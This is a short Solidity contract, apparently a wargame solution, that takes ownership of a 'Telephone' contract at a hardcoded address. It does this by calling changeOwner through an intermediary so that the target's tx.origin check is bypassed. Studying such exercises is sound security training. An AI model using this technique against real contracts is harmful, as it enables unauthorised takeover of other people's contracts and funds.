pragma solidity 0.8.10;

interface ITelephone{
    function changeOwner(address _owner) external;
}

contract AttackTelephone{  
    address telephoneAddress = 0x16a5385C66f06D6190eAbD5979816317f314Fe4C;
    ITelephone public telephoneContract = ITelephone(telephoneAddress);
    function flip() external {
        telephoneContract.changeOwner(msg.sender);
    }
}
